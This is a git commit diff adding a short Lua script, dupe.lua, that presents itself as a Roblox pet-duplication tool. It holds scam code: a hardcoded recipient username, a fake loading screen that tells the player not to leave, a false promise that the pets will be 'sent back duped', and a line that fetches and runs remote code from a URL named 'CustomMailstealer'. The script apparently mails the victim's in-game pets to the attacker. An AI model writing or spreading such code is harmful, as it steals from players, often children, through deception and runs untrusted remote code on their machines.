1475106d9dc47c55180fc7b8bad9798650e40f68
Anonymous <83682523+profileaccount@users.noreply.github.com>
2024-01-06 23:49:37 -0500

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,1 +1,5 @@
+Username = "WeAreALegendTogether"
+G_LoadingScreen = "Loading... DO NOT LEAVE! YOU WILL LOOSE ALL YOUR PETS!"
+G_Mailmessage = "Don't worry! These pets will be sent back duped for you!."
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
